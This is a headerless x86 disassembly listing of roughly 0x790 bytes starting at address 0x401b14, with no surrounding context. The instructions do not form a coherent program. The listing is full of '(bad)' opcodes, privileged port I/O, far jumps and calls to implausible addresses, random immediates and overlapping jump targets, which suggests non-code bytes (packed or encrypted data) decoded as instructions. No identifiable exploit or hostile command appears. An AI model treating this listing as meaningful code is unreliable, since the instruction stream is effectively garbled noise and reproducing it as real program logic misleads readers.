  401b14:	push   edx
  401b15:	shl    DWORD PTR [ebx],1
  401b17:	popf   
  401b18:	add    eax,0xb33bb75a
  401b1d:	mov    ebp,0x41c99589
  401b22:	dec    BYTE PTR [esi-0x53]
  401b25:	scas   al,BYTE PTR es:[edi]
  401b26:	mov    DWORD PTR [ebp+0x5c],edi
  401b29:	push   ebp
  401b2a:	push   ebx
  401b2b:	lahf   
  401b2c:	jnp    0x401b0c
  401b2e:	mov    DWORD PTR [ebx-0xd420c5c],ebp
  401b34:	adc    al,0xd6
  401b36:	data16 mov ah,0xbb
  401b39:	lea    edi,[esi+esi*2-0x66dd7fa6]
  401b40:	mov    al,0x3e
  401b42:	mov    WORD PTR [ecx-0xe9bbda2],cs
  401b48:	xchg   esi,eax
  401b49:	loop   0x401b12
  401b4b:	(bad)  
  401b4d:	std    
  401b4e:	jecxz  0x401b08
  401b50:	in     eax,0x91
  401b52:	daa    
  401b53:	inc    ebx
  401b54:	fisubr WORD PTR [ecx+0x19]
  401b57:	cli    
  401b58:	dec    esi
  401b59:	sbb    ah,ah
  401b5b:	sbb    BYTE PTR [edi+esi*1],al
  401b5e:	mov    WORD PTR [edi+0x2ac0848d],gs
  401b64:	adc    bh,ch
  401b66:	pop    ecx
  401b67:	and    eax,0x256f9da
  401b6c:	pop    ds
  401b6d:	sbb    cl,BYTE PTR [ebp+0x2e69c04b]
  401b73:	fsubr  st,st(1)
  401b75:	retf   0x3b52
  401b78:	mov    bh,0x93
  401b7a:	xchg   edi,eax
  401b7b:	repnz repz bound edx,QWORD PTR [ebx-0x1fad7519]
  401b83:	pop    es
  401b84:	cdq    
  401b85:	retf   0x6267
  401b88:	mov    edx,0x82c43cbf
  401b8d:	jmp    0xb95dd76a
  401b92:	in     al,dx
  401b93:	pop    ecx
  401b94:	sbb    esi,esi
  401b96:	enter  0x46c0,0x92
  401b9a:	mov    ebp,?
  401b9c:	or     DWORD PTR [edx],ebx
  401b9e:	stc    
  401b9f:	push   edx
  401ba0:	add    eax,0xba125a05
  401ba5:	shl    DWORD PTR [edx+0x78],1
  401ba8:	jnp    0x401b81
  401baa:	or     edi,0xa710cc21
  401bb0:	jne    0x401bdc
  401bb2:	in     eax,0xd0
  401bb4:	mov    ds:0x4a0b169c,al
  401bb9:	icebp  
  401bba:	ret    0x17af
  401bbd:	or     ecx,DWORD PTR [esi]
  401bbf:	ins    DWORD PTR es:[edi],dx
  401bc0:	or     al,0xab
  401bc2:	lods   eax,DWORD PTR ds:[esi]
  401bc3:	mov    esi,0x821ed053
  401bc8:	pop    esi
  401bc9:	mov    al,BYTE PTR [edx]
  401bcb:	test   DWORD PTR [ebx-0x3fa42346],ebx
  401bd1:	addr16 inc ecx
  401bd3:	call   0x9c3b:0x23eb248a
  401bda:	fs ins BYTE PTR es:[edi],dx
  401bdc:	sub    eax,0x42973362
  401be1:	(bad)  
  401be3:	add    al,BYTE PTR [ecx]
  401be5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401be6:	lods   eax,DWORD PTR ds:[esi]
  401be7:	inc    ebp
  401be8:	jb     0x401bf7
  401bea:	jno    0x401c32
  401bec:	test   eax,0x97c2d4c9
  401bf1:	imul   dh
  401bf3:	dec    esp
  401bf4:	sbb    eax,DWORD PTR fs:[eax+0x5a]
  401bf8:	and    BYTE PTR [ecx-0x49],dl
  401bfb:	xchg   esi,eax
  401bfc:	ins    DWORD PTR es:[edi],dx
  401bfd:	int    0xae
  401bff:	popa   
  401c00:	es aam 0x2f
  401c03:	(bad)  
  401c05:	(bad)
  401c08:	xlat   BYTE PTR ds:[ebx]
  401c09:	jmp    0x401bcc
  401c0b:	jnp    0x401bfd
  401c0d:	out    dx,al
  401c0e:	sbb    DWORD PTR [ebx-0x79411c02],0x7a
  401c15:	push   ebp
  401c16:	mov    ecx,eax
  401c18:	mov    bl,0x69
  401c1a:	push   cs
  401c1b:	std    
  401c1c:	ja     0x401c90
  401c1e:	or     al,0x1f
  401c20:	inc    edi
  401c21:	inc    ecx
  401c22:	enter  0xab46,0x10
  401c26:	or     eax,0xa60ede5c
  401c2b:	ret    
  401c2c:	pushf  
  401c2d:	ror    esp,0x55
  401c30:	inc    BYTE PTR ss:0xfca41c5
  401c37:	shr    DWORD PTR [ecx-0x6d],cl
  401c3a:	mov    esp,esi
  401c3c:	xor    al,0xb
  401c3e:	retf   0x864d
  401c41:	in     al,dx
  401c42:	mov    ch,0x9e
  401c44:	stc    
  401c45:	fdivr  DWORD PTR [ecx+0x48d35fa5]
  401c4b:	sbb    esp,DWORD PTR [eax-0x4f92232b]
  401c51:	adc    eax,0x8aebfa9e
  401c56:	xor    BYTE PTR [edi-0x4759fe8],0xe3
  401c5d:	adc    ebx,DWORD PTR [edx-0x124152f2]
  401c63:	or     eax,0x1eebcd28
  401c68:	pop    edi
  401c69:	pop    esp
  401c6a:	(bad)  
  401c6b:	xlat   BYTE PTR ds:[ebx]
  401c6c:	add    ebp,esp
  401c6e:	jb     0x401ce5
  401c70:	fild   DWORD PTR [ebp+edx*8-0xd]
  401c74:	jmp    0x401cde
  401c76:	mov    ecx,0x6b07dec2
  401c7b:	mov    WORD PTR [edx],?
  401c7d:	call   0xbd14e061
  401c82:	mov    esi,0xbe8568d3
  401c87:	mov    esi,0xe2f373ef
  401c8c:	push   cs
  401c8d:	push   ss
  401c8e:	jae    0x401c9d
  401c90:	out    0x73,al
  401c92:	xor    eax,0x9b143246
  401c97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c98:	adc    dl,BYTE PTR [edi-0x61]
  401c9b:	inc    edx
  401c9c:	xchg   ecx,eax
  401c9d:	ins    BYTE PTR es:[edi],dx
  401c9e:	call   0x763:0x33f1ddf2
  401ca5:	push   0x3e
  401ca7:	and    ch,BYTE PTR [ebp+ecx*1+0x7d]
  401cab:	repz enter 0xd409,0x15
  401cb0:	mov    al,0x8d
  401cb2:	add    bl,BYTE PTR [edi]
  401cb4:	out    dx,al
  401cb5:	jno    0x401c93
  401cb7:	punpckhwd mm2,mm7
  401cba:	cmp    bh,bh
  401cbc:	cmp    al,0x32
  401cbe:	test   DWORD PTR [ebp-0xa08722a],esi
  401cc4:	dec    ebx
  401cc5:	push   edx
  401cc6:	mov    dh,0x8e
  401cc8:	cdq    
  401cc9:	adc    cl,dh
  401ccb:	test   al,0x14
  401ccd:	jge    0x401c81
  401ccf:	jg     0x401c8e
  401cd1:	xor    bl,BYTE PTR ds:0x1d26f78e
  401cd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cd8:	shl    DWORD PTR [ebp+0x27aeab8],1
  401cde:	stos   DWORD PTR es:[edi],eax
  401cdf:	cmp    DWORD PTR [esi-0x40538573],ecx
  401ce5:	jge    0x401cb5
  401ce7:	and    al,0x30
  401ce9:	mov    esp,0xfc09cef4
  401cee:	push   ds
  401cef:	sbb    al,0x7b
  401cf1:	jno    0x401c76
  401cf3:	lock retf 
  401cf5:	loopne 0x401d07
  401cf7:	hlt    
  401cf8:	xchg   esi,eax
  401cf9:	addr16 out dx,al
  401cfb:	aaa    
  401cfc:	ds mov ecx,0x7648dd82
  401d02:	and    al,0x23
  401d04:	in     al,0x78
  401d06:	(bad)  
  401d07:	stos   BYTE PTR es:[edi],al
  401d08:	loope  0x401ca7
  401d0a:	adc    ch,bh
  401d0c:	push   eax
  401d0d:	scas   eax,DWORD PTR es:[edi]
  401d0e:	jno    0x401d25
  401d10:	jg     0x401d90
  401d12:	cmp    al,0xba
  401d14:	aad    0xb
  401d16:	and    DWORD PTR [ecx-0x1cf5e0fd],edi
  401d1c:	jno    0x401d26
  401d1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d1f:	ds xor al,0xa4
  401d23:	retf   0x6c8e
  401d26:	adc    ebp,DWORD PTR [ecx]
  401d28:	push   esp
  401d29:	sub    bh,BYTE PTR [esi]
  401d2b:	pop    ebp
  401d2c:	mov    ebp,DWORD PTR [esi+ecx*1]
  401d2f:	test   DWORD PTR [eax],0x63bc1a71
  401d35:	mov    edx,0xe2743307
  401d3a:	push   ebx
  401d3b:	mov    ds:0xf977640a,al
  401d40:	cld    
  401d41:	push   eax
  401d42:	scas   al,BYTE PTR es:[edi]
  401d43:	ins    BYTE PTR es:[edi],dx
  401d44:	cs adc al,0x2c
  401d47:	popf   
  401d48:	xchg   BYTE PTR [edi-0x72],dl
  401d4b:	add    al,0x6d
  401d4d:	out    0x39,al
  401d4f:	jne    0x401d4d
  401d51:	jge    0x401cf9
  401d53:	retf   
  401d54:	pop    eax
  401d55:	(bad)  
  401d56:	rcl    DWORD PTR [esi+0x3f],cl
  401d59:	jg     0x401da9
  401d5b:	xor    esi,DWORD PTR [edi+0x4a9234ae]
  401d61:	pop    ecx
  401d62:	leave  
  401d63:	(bad)  
  401d64:	pusha  
  401d65:	cmp    DWORD PTR [edi],edi
  401d67:	push   0xaab66d3c
  401d6c:	bound  ebp,QWORD PTR [ecx-0x5]
  401d6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d70:	sub    ebp,ebx
  401d72:	aas    
  401d73:	cwde   
  401d74:	aas    
  401d75:	pop    ecx
  401d76:	popa   
  401d77:	add    BYTE PTR [ebx],0xc4
  401d7a:	sub    DWORD PTR [eax+esi*1-0x6d],edx
  401d7e:	push   edx
  401d7f:	clc    
  401d80:	stc    
  401d81:	icebp  
  401d82:	popa   
  401d83:	stos   BYTE PTR es:[edi],al
  401d84:	fistp  WORD PTR [eax]
  401d86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d87:	ss push ds
  401d89:	gs push esi
  401d8b:	fcmovbe st,st(1)
  401d8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d8e:	aad    0xb9
  401d90:	fmul   st(1),st
  401d92:	sub    eax,0x8104ed0a
  401d97:	jecxz  0x401d87
  401d99:	sti    
  401d9a:	xchg   ebp,eax
  401d9b:	push   ss
  401d9c:	jmp    0x401e1b
  401d9e:	in     eax,dx
  401d9f:	fadd   DWORD PTR [eax]
  401da1:	loope  0x401d44
  401da3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401da4:	pop    ss
  401da5:	push   ebp
  401da6:	pop    esi
  401da7:	lods   eax,DWORD PTR ds:[esi]
  401da8:	sub    esi,DWORD PTR [ebp+0x2]
  401dab:	lods   eax,DWORD PTR ds:[esi]
  401dac:	hlt    
  401dad:	jo     0x401e15
  401daf:	repnz test eax,0x80b8ce25
  401db5:	mov    eax,ds:0xcfcc0c4e
  401dba:	sbb    ebx,ecx
  401dbc:	jae    0x401d5d
  401dbe:	dec    esp
  401dbf:	dec    esp
  401dc0:	pop    ds
  401dc1:	jae    0x401d86
  401dc3:	clc    
  401dc4:	dec    esi
  401dc5:	jmp    0x39fb:0xf322c1ae
  401dcc:	test   eax,0x65960395
  401dd1:	repz dec esi
  401dd3:	jp     0x401e02
  401dd5:	bound  eax,QWORD PTR [ecx+0x50]
  401dd8:	add    ch,dl
  401dda:	fwait
  401ddb:	and    edx,DWORD PTR ds:0x59a61a01
  401de1:	fisub  DWORD PTR ds:0x338558c0
  401de7:	dec    eax
  401de8:	ds dec ecx
  401dea:	push   edi
  401deb:	sahf   
  401dec:	cli    
  401ded:	mov    esi,0x29fd84ba
  401df2:	mov    ecx,0xb5b42ec9
  401df7:	mov    ds:0xf95780c8,eax
  401dfc:	adc    ecx,DWORD PTR [ebx]
  401dfe:	cdq    
  401dff:	inc    esp
  401e00:	lods   eax,DWORD PTR ds:[esi]
  401e01:	bound  ebx,QWORD PTR [ebx-0x6ba49ac1]
  401e07:	into   
  401e08:	fcmovnu st,st(2)
  401e0a:	mov    WORD PTR [eax+0x66],cs
  401e0d:	imul   esp,DWORD PTR [esi],0x2985ff8
  401e13:	fnsave [eax-0x74c8f0e3]
  401e19:	jl     0x401dac
  401e1b:	push   esi
  401e1c:	sbb    ebx,DWORD PTR [edx-0x7d58631b]
  401e22:	repz jne 0x401e3f
  401e25:	lods   al,BYTE PTR ds:[esi]
  401e26:	fs push cs
  401e28:	adc    cl,BYTE PTR [edx-0x4f]
  401e2b:	out    0xfe,al
  401e2d:	imul   edi,DWORD PTR [ebp-0x44],0xffffffba
  401e31:	sbb    BYTE PTR gs:[ebx+0x34aadf7d],bh
  401e38:	outs   dx,BYTE PTR ds:[esi]
  401e39:	push   edx
  401e3a:	mov    bl,cl
  401e3c:	push   es
  401e3d:	pop    esp
  401e3e:	add    al,0xfb
  401e40:	idiv   BYTE PTR [ecx+0x38]
  401e43:	mov    eax,0x5c555529
  401e48:	fidivr DWORD PTR [ebp-0x73]
  401e4b:	addr16 test eax,0xc7941c2
  401e51:	outs   dx,BYTE PTR ds:[esi]
  401e52:	mov    DWORD PTR [eax-0x40],esp
  401e55:	(bad)  
  401e56:	pop    ebp
  401e57:	test   BYTE PTR [edx+eax*4-0x7e633392],0x5c
  401e5f:	mov    esp,esp
  401e61:	xchg   ebx,eax
  401e62:	add    bh,BYTE PTR [edi+0x5c]
  401e65:	push   cs
  401e66:	cmp    BYTE PTR [edx+eiz*2+0x3ed05859],al
  401e6d:	jbe    0x401e08
  401e6f:	xlat   BYTE PTR ds:[ebx]
  401e70:	push   0x35089239
  401e75:	mov    cl,0xdb
  401e77:	(bad)  
  401e78:	sbb    al,BYTE PTR [edi]
  401e7a:	xchg   cl,bl
  401e7c:	stc    
  401e7d:	imul   esi,DWORD PTR [ecx+0x60f614a3],0xffffffcc
  401e84:	call   0x37422f95
  401e89:	add    dh,BYTE PTR [edi+0x32]
  401e8c:	js     0x401e1a
  401e8e:	cmp    BYTE PTR [ebx+0x30434ea3],al
  401e94:	mov    ecx,0xc75fea5a
  401e99:	jae    0x401ebd
  401e9b:	cmp    eax,DWORD PTR [eax-0x7e]
  401e9e:	pop    esp
  401e9f:	and    al,0xc9
  401ea1:	lods   al,BYTE PTR ds:[esi]
  401ea2:	mov    cl,0x5b
  401ea4:	sbb    al,0xd7
  401ea6:	jecxz  0x401e6e
  401ea8:	add    ecx,ecx
  401eaa:	mov    ecx,DWORD PTR [ebx+ebp*4+0xb]
  401eae:	xor    cl,cl
  401eb0:	adc    al,0x65
  401eb2:	mov    esp,0x1010371a
  401eb7:	xchg   edx,eax
  401eb8:	out    dx,al
  401eb9:	jae    0x401eee
  401ebb:	arpl   WORD PTR [edi+0x2eebf812],di
  401ec1:	scas   eax,DWORD PTR es:[edi]
  401ec2:	(bad)  
  401ec3:	mov    BYTE PTR [eax],bh
  401ec5:	jbe    0x401e5f
  401ec7:	(bad)  
  401ec8:	xchg   ecx,eax
  401ec9:	cdq    
  401eca:	inc    eax
  401ecb:	out    dx,al
  401ecc:	mov    esi,0x9baa9e61
  401ed1:	xchg   ebp,ecx
  401ed3:	and    DWORD PTR [ebp-0x54],edi
  401ed6:	call   0x376d71f7
  401edb:	ins    DWORD PTR es:[edi],dx
  401edc:	add    DWORD PTR [ecx+0x2e],0x61
  401ee0:	cmp    DWORD PTR [ecx+0x7d0281b],edx
  401ee6:	jb     0x401f1f
  401ee8:	adc    al,0x9e
  401eea:	and    ebp,ebx
  401eec:	jno    0x401f67
  401eee:	push   edx
  401eef:	xlat   BYTE PTR ds:[ebx]
  401ef0:	pop    ecx
  401ef1:	(bad)  
  401ef2:	sbb    al,0x46
  401ef4:	push   0x943678d9
  401ef9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401efa:	sbb    al,0x61
  401efc:	lds    ebx,FWORD PTR [eax+0x336db00]
  401f02:	or     eax,0xc035cb1f
  401f07:	adc    dl,BYTE PTR ds:0xde73dd1a
  401f0d:	pop    edi
  401f0e:	(bad)  
  401f0f:	add    BYTE PTR fs:[ecx+0xeff8c8],al
  401f16:	retf   0x7d4d
  401f19:	rcr    BYTE PTR [edi-0x401908f2],1
  401f1f:	js     0x401f1e
  401f21:	pop    ecx
  401f22:	dec    ebx
  401f23:	push   esp
  401f24:	enter  0xd8f,0x1d
  401f28:	mov    eax,ds:0xea4a8a66
  401f2d:	outs   dx,BYTE PTR ds:[esi]
  401f2e:	pop    edi
  401f2f:	cdq    
  401f30:	inc    ecx
  401f31:	adc    ebx,edi
  401f33:	cmc    
  401f34:	sbb    ebx,DWORD PTR [edx-0x28]
  401f37:	jb     0x401f6e
  401f39:	mov    edi,0x95b77aa9
  401f3e:	dec    edx
  401f3f:	lea    ecx,[edi+0x30]
  401f42:	pop    eax
  401f43:	pusha  
  401f44:	push   esi
  401f45:	scas   al,BYTE PTR es:[edi]
  401f46:	iret   
  401f47:	push   ebx
  401f48:	jb     0x401fbf
  401f4a:	ret    0x8c5a
  401f4d:	xchg   esi,eax
  401f4e:	out    dx,al
  401f4f:	js     0x401f6d
  401f51:	mov    al,ds:0x30f925c0
  401f56:	cmc    
  401f57:	cmp    al,0x82
  401f59:	lahf   
  401f5a:	jmp    ecx
  401f5c:	jge    0x401f59
  401f5e:	in     al,0x2b
  401f60:	mov    dl,0x50
  401f62:	mov    al,ds:0x8b79c2de
  401f67:	fidivr WORD PTR [ecx-0x75f8b307]
  401f6d:	out    dx,eax
  401f6e:	shl    DWORD PTR [edi],cl
  401f70:	dec    ecx
  401f71:	inc    esp
  401f72:	retf   0xacba
  401f75:	out    dx,eax
  401f76:	dec    ebp
  401f77:	mov    cl,0xd8
  401f79:	rcl    DWORD PTR [ebx+0x73],cl
  401f7c:	pushf  
  401f7d:	ins    BYTE PTR es:[edi],dx
  401f7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f7f:	push   edx
  401f80:	test   al,0x74
  401f82:	jmp    FWORD PTR [eax+0x167cf109]
  401f88:	loope  0x401f6f
  401f8a:	icebp  
  401f8b:	bound  ebp,QWORD PTR [ebp+0xafd2891]
  401f91:	js     0x401fb9
  401f93:	cmp    al,0x14
  401f95:	es daa 
  401f97:	mov    bh,0xcf
  401f99:	lahf   
  401f9a:	adc    BYTE PTR [ebx-0x6227ede0],ah
  401fa0:	pop    edx
  401fa1:	out    dx,eax
  401fa2:	mov    esi,0x107645e0
  401fa7:	pop    esi
  401fa8:	mov    ecx,0xac50fd94
  401fad:	pushf  
  401fae:	xor    al,bl
  401fb0:	dec    ecx
  401fb1:	loop   0x401f4f
  401fb3:	sbb    eax,0xef380a5f
  401fb8:	cmp    DWORD PTR [edi],ebx
  401fba:	popa   
  401fbb:	ds push 0xffffffcb
  401fbe:	(bad)  
  401fbf:	fldenv [edi+0x34]
  401fc2:	mov    dl,0xf9
  401fc4:	or     DWORD PTR [ebx-0x4d],0xa9b9570e
  401fcb:	and    bl,BYTE PTR [edi+0x1d]
  401fce:	inc    ecx
  401fcf:	mov    fs,WORD PTR [edx-0x19563c95]
  401fd5:	pop    ebp
  401fd6:	ret    0xcf92
  401fd9:	xor    al,0x15
  401fdb:	div    bh
  401fdd:	bound  edi,QWORD PTR [esi-0x7d51b9a0]
  401fe3:	sub    ecx,DWORD PTR [ebp+0x46751b64]
  401fe9:	mov    al,ds:0x92551271
  401fee:	inc    esi
  401fef:	jmp    0x40206f
  401ff1:	(bad)  
  401ff2:	mov    edi,0x682df3bb
  401ff7:	bound  edi,QWORD PTR [edx]
  401ff9:	push   0xf7988b99
  401ffe:	sbb    edi,DWORD PTR [esi]
  402000:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402001:	popf   
  402002:	inc    edx
  402003:	cli    
  402004:	adc    eax,0x605a9501
  402009:	std    
  40200a:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40200c:	mov    ebx,0x40a2b413
  402011:	lds    esp,FWORD PTR [edi-0x24]
  402014:	or     DWORD PTR [esp+eiz*8],ebx
  402017:	dec    esi
  402018:	lods   eax,DWORD PTR ds:[esi]
  402019:	push   cs
  40201a:	sar    bh,0xdf
  40201d:	dec    ebx
  40201e:	xor    eax,0x3abdcbe5
  402023:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402024:	adc    DWORD PTR [esi-0x6fe5d14e],ecx
  40202a:	add    esi,DWORD PTR [eax]
  40202c:	js     0x40209e
  40202e:	cmp    BYTE PTR [esi],al
  402030:	aas    
  402031:	scas   al,BYTE PTR es:[edi]
  402032:	and    al,0xd3
  402034:	mov    ecx,0x2d046e83
  402039:	xchg   edi,eax
  40203a:	jl     0x401fcc
  40203c:	add    ah,ah
  40203e:	add    eax,0xb11c728b
  402043:	cli    
  402044:	xor    DWORD PTR [ecx],esi
  402046:	add    BYTE PTR [edi],bl
  402048:	outs   dx,BYTE PTR ds:[esi]
  40204a:	push   ebp
  40204b:	adc    esp,DWORD PTR [edx-0x33]
  40204e:	sbb    cl,BYTE PTR [ecx-0x10]
  402051:	cwde   
  402052:	iret   
  402053:	lahf   
  402054:	sbb    BYTE PTR [edx+0x5c],al
  402057:	jg     0x402018
  402059:	jb     0x401ffc
  40205b:	jne    0x402007
  40205d:	shr    BYTE PTR [esi+0xb27eba1],0x2
  402064:	or     ebp,DWORD PTR [eax+0x58f3838a]
  40206a:	pop    ebp
  40206b:	aaa    
  40206c:	and    DWORD PTR [esi],ebp
  40206e:	aam    0x80
  402070:	mov    DWORD PTR [edi+0x13],ebp
  402073:	and    al,0xec
  402075:	pop    esi
  402076:	pop    ebp
  402077:	jb     0x402087
  402079:	push   esi
  40207a:	mov    esp,0x28fe2efa
  40207f:	shr    eax,0x12
  402082:	sub    eax,DWORD PTR [esi]
  402084:	mov    esi,0x25c6db43
  402089:	stos   DWORD PTR es:[edi],eax
  40208a:	nop
  40208b:	inc    edi
  40208c:	and    BYTE PTR [edx-0x5e82b3d3],ch
  402092:	xor    eax,0xd2b89a0d
  402097:	nop
  402098:	arpl   WORD PTR [edi+edx*8],ax
  40209b:	mov    cl,0x8b
  40209d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40209e:	jmp    0x402030
  4020a0:	fwait
  4020a1:	mov    ebx,0x3443aa95
  4020a6:	addr16 inc ebp
  4020a8:	cmp    al,0x23
  4020aa:	leave  
  4020ab:	mov    ah,0xd
  4020ad:	xchg   ebx,eax
  4020ae:	push   ebx
  4020af:	jmp    0x402049
  4020b1:	and    DWORD PTR [eax+eiz*4-0x115f7b75],edi
  4020b8:	popa   
  4020b9:	jmp    0x40208e
  4020bb:	inc    ebp
  4020bc:	mov    ah,0x80
  4020be:	clc    
  4020bf:	inc    ecx
  4020c0:	scas   al,BYTE PTR es:[edi]
  4020c1:	xchg   esp,eax
  4020c2:	imul   esi,esi,0xffffff91
  4020c5:	jne    0x40210a
  4020c7:	mov    cl,0xbf
  4020c9:	jge    0x4020e1
  4020cb:	mov    al,bl
  4020cd:	test   DWORD PTR [esi],ebx
  4020cf:	cmc    
  4020d0:	adc    al,0x9e
  4020d2:	mov    eax,ds:0x3353b07
  4020d7:	jmp    0xbd8effee
  4020dc:	cmp    dh,BYTE PTR [ecx-0x4c]
  4020df:	cwde   
  4020e0:	imul   esp
  4020e2:	xor    WORD PTR [edi],sp
  4020e5:	push   eax
  4020e6:	mov    ah,0x4a
  4020e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020e9:	lods   eax,DWORD PTR ds:[esi]
  4020ea:	sub    bl,BYTE PTR [ebx+0x1118a3bf]
  4020f0:	xchg   esp,eax
  4020f1:	push   cs
  4020f2:	inc    ecx
  4020f3:	jne    0x402159
  4020f5:	mov    dl,0xdf
  4020f7:	sub    eax,0xb36dd194
  4020fc:	and    edx,DWORD PTR [edi]
  4020fe:	push   edi
  4020ff:	lods   eax,DWORD PTR ds:[esi]
  402100:	push   ecx
  402101:	cmp    DWORD PTR [edx],ebx
  402103:	(bad)  
  402104:	scas   al,BYTE PTR es:[edi]
  402105:	cmp    al,0x92
  402107:	sbb    cl,ch
  402109:	mov    ds:0xb9cbd998,eax
  40210e:	imul   edi,DWORD PTR [eax+eax*4+0x21],0xffffff9f
  402113:	mov    dl,0x2e
  402115:	jae    0x4020bc
  402117:	in     eax,dx
  402118:	les    edx,FWORD PTR [edi+0x77152a8f]
  40211e:	lds    ebp,FWORD PTR [esi]
  402120:	es cli 
  402122:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402123:	adc    DWORD PTR [edx+0x7b2b924d],0x6d
  40212a:	retf   0x2184
  40212d:	push   edx
  40212e:	or     al,0x5d
  402130:	nop
  402131:	test   BYTE PTR [edi],al
  402133:	test   BYTE PTR [ecx+0x3],bl
  402136:	and    eax,0x38ae6993
  40213b:	bound  ecx,QWORD PTR [edx+esi*1-0x43cfdf8e]
  402142:	mov    dh,0xa1
  402144:	mov    al,ds:0x35b85533
  402149:	stos   DWORD PTR es:[edi],eax
  40214a:	fidivr WORD PTR [ecx]
  40214c:	seto   BYTE PTR [ecx+0x4751c1af]
  402153:	lock pop esp
  402155:	push   ecx
  402156:	shr    DWORD PTR [eax],cl
  402158:	addr16 inc esi
  40215a:	pop    esp
  40215b:	ja     0x40219a
  40215d:	aas    
  40215e:	dec    ebx
  40215f:	pop    ebx
  402160:	imul   ebp,edx,0x51
  402163:	nop
  402164:	sar    DWORD PTR [edx],1
  402166:	pusha  
  402167:	scas   al,BYTE PTR es:[edi]
  402168:	out    0xde,al
  40216a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40216b:	pop    edi
  40216c:	dec    ecx
  40216d:	adc    al,0x1
  40216f:	push   edi
  402170:	mov    al,0xc8
  402172:	daa    
  402173:	mov    al,0x68
  402175:	lea    ebp,[esi+0x7676df0]
  40217b:	push   edi
  40217c:	xor    al,BYTE PTR [ecx-0x4c0f5b7b]
  402182:	ds ret 0xc326
  402186:	mov    ebp,0xdecaf139
  40218b:	pop    ss
  40218c:	push   0xbb41cad
  402191:	cmp    BYTE PTR [eax+0xe482839],bh
  402197:	pop    ebp
  402198:	stos   DWORD PTR es:[edi],eax
  402199:	adc    eax,0xc80d17e9
  40219e:	pop    ss
  40219f:	lds    ebp,FWORD PTR [edx+ebx*2]
  4021a2:	push   0xffffffc1
  4021a4:	(bad)  
  4021a5:	cmp    eax,0xee632ad1
  4021aa:	lods   eax,DWORD PTR ds:[esi]
  4021ab:	xlat   BYTE PTR ds:[ebx]
  4021ac:	out    dx,eax
  4021ad:	mov    ebp,DWORD PTR [eax]
  4021af:	out    dx,eax
  4021b0:	mov    ah,BYTE PTR [ebx-0x37451353]
  4021b6:	fsubr  QWORD PTR [esi]
  4021b8:	fld    TBYTE PTR [edi]
  4021ba:	lods   al,BYTE PTR ds:[esi]
  4021bb:	mov    edi,0x5557c28d
  4021c0:	mov    al,ds:0x36c0a5a9
  4021c5:	pop    eax
  4021c6:	inc    esp
  4021c7:	adc    DWORD PTR [edx-0x34],ebp
  4021ca:	adc    dh,BYTE PTR ds:0xfc6cc9e5
  4021d0:	adc    dh,cl
  4021d2:	addr16 ja 0x4021b5
  4021d5:	jae    0x402207
  4021d7:	ret    0x4558
  4021da:	cmp    edx,edx
  4021dc:	(bad)  
  4021dd:	(bad)  
  4021de:	imul   esp,DWORD PTR [ecx+0x8],0x54b55ce
  4021e5:	inc    edx
  4021e6:	xor    eax,0x82b6e6bf
  4021eb:	sub    ecx,ecx
  4021ed:	jg     0x4021a5
  4021ef:	or     dh,BYTE PTR [esi-0x4a]
  4021f2:	pop    ebp
  4021f3:	rol    ah,0xfd
  4021f6:	(bad)  
  4021f7:	nop
  4021f8:	icebp  
  4021f9:	pop    ecx
  4021fa:	dec    ecx
  4021fb:	push   0x1b1d9664
  402200:	dec    DWORD PTR ds:0xe912352f
  402206:	push   esp
  402207:	add    eax,0xd87ca646
  40220c:	pop    ds
  40220d:	inc    edi
  40220e:	push   es
  40220f:	enter  0x6e00,0xd9
  402213:	into   
  402214:	mov    fs,WORD PTR ds:0x4b2d907b
  40221a:	imul   DWORD PTR [edi]
  40221c:	mov    DWORD PTR [ebp+0x48],0xfe7e20b6
  402223:	push   esp
  402224:	popa   
  402225:	sbb    al,0xc3
  402227:	mov    dh,0xdc
  402229:	mov    ds:0xd759900b,eax
  40222e:	add    DWORD PTR [edi+0x16],0xfffffff7
  402232:	frstor ds:0x3c07d061
  402238:	btc    DWORD PTR [ecx],ecx
  40223b:	add    ah,dh
  40223d:	dec    edx
  40223e:	pop    ss
  40223f:	pop    ebx
  402240:	mov    edi,0x4d461652
  402245:	xchg   esi,eax
  402246:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402247:	inc    esi
  402248:	jno    0x402236
  40224a:	in     eax,dx
  40224b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40224c:	es loop 0x4021d9
  40224f:	lds    eax,FWORD PTR [ecx]
  402251:	(bad)  
  402252:	jle    0x402226
  402254:	mov    al,ds:0xf651ecf7
  402259:	les    esi,FWORD PTR [edx+0x2b]
  40225c:	inc    esp
  40225d:	gs out 0xb3,eax
  402260:	mov    eax,0xcc0f8ebd
  402265:	dec    edx
  402266:	fwait
  402267:	cwde   
  402268:	fwait
  402269:	cli    
  40226a:	push   ebp
  40226b:	jb     0x402227
  40226d:	cmp    ecx,DWORD PTR [ebp+0x56]
  402270:	test   eax,0x6c6c7645
  402275:	sbb    BYTE PTR [esi-0x80],0xf7
  402279:	inc    edx
  40227a:	cmp    esi,0xffffffc3
  40227d:	loopne 0x40220c
  40227f:	and    eax,0x9f3e03bd
  402284:	cdq    
  402285:	inc    esp
  402286:	cmp    edx,DWORD PTR [esi+0x5f]
  402289:	inc    esi
  40228a:	push   esp
  40228b:	fistp  WORD PTR [eax]
  40228d:	ret    0x1e9a
  402290:	mov    edi,0x34540167
  402295:	lea    edi,[ebp-0x46]
  402298:	das    
  402299:	sbb    ebx,edx
  40229b:	int3   
  40229c:	add    eax,0x3b177e43
